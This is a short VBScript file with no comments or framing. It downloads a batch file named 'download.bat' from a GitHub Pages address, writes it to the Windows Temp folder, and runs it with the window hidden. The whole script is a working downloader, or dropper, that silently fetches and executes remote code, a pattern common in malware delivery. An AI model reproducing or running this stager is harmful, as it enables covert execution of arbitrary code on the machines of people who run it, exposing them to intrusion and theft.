Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.Open "GET", "https://cabraucases4.github.io/cabraucases4/download.bat", False
objXMLHTTP.Send

Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Type = 1
objADOStream.Open
objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.SaveToFile "C:\Windows\Temp\download.bat", 2
objADOStream.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Run "C:\Windows\Temp\download.bat", 0, False

